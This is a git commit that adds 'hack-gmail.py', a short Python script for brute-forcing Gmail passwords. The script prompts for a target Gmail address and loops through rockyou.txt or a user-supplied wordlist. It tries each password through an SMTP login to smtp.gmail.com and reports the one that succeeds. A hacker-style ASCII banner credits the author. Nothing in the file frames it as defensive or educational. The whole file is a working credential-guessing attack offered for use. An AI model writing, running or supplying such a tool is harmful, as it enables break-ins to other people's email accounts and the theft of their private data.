0b15926d762c67e685215b8d567cb6cc09875be5
d4az <66930150+d4az@users.noreply.github.com>
2020-09-09 01:25:49 +0530

    Create hack-gmail.py

---
+++ hack-gmail.py
@@ -0,0 +1,52 @@
+import smtplib
+from os import system
+def artwork():
+    print("\n")
+    print("##########################################################")
+    print("#                                                        #")
+    print("#                     \||/                               #")
+    print("#                     |  @___oo                          #")
+    print("#           /\  /\   / (__,,,,|                          #")
+    print("#          ) /^\) ^\/ _)                GmailHack!       #")
+    print("#          )   /^\/   _)                CoDeD By:        #")
+    print("#          )   _ /  / _)                         d4az    #")
+    print("#      /\  )/\/ ||  | )_)                                #")
+    print("#     <  >      |(,,) )__)                               #")
+    print("#      ||      /    \)___)\                              #")
+    print("#      | \____(      )___) )___                          #")
+    print("#      \______(_______;;; __;;;                          #")
+    print("#                                                        #")
+    print("##########################################################")
+    print("\n")
+
+artwork()
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter The Target Gmail Adress => ")
+
+print("\n")
+
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to add a custom password list\n => ")
+
+if pwd=='0':
+    passswfile="rockyou.txt"
+
+else :
+    print("\n")
+    passswfile = input("Name The File Path (For Password List) => ")
+
+passswfile = open(passswfile, "r")
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Pasword Is Wrong. %s " % password)
+
